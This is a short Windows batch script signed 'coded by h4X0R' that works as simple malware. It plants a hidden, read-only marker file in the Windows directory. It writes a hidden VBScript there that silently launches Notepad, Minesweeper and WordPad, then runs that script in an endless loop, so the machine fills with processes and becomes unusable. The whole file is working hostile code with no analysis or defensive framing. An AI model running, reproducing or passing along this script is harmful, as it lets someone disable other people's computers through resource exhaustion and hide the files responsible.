@echo off
if exist %windir%\win32.sys goto :exit
echo coded by h4X0R >%windir%\win32.sys
attrib +r +a +s +h %windir%\win32.sys

:------------------------------------

echo on error resume next >%windir%\dos.vbs
echo Set WshShell =CreateObject("WScript.Shell") >>%windir%\dos.vbs
echo a=WshShell.Run("%windir%\system32\notepad.exe" ,0,False) >>%windir%\dos.vbs
echo a=WshShell.Run("%windir%\system32\winmine.exe" ,0,False) >>%windir%\dos.vbs
echo a=WshShell.Run("%windir%\system32\write.exe" ,0,False) >>%windir%\dos.vbs
attrib +r +a +s +h %windir%\dos.vbs
:loop
%windir%\dos.vbs
goto :loop

:------------------------------------

:exit

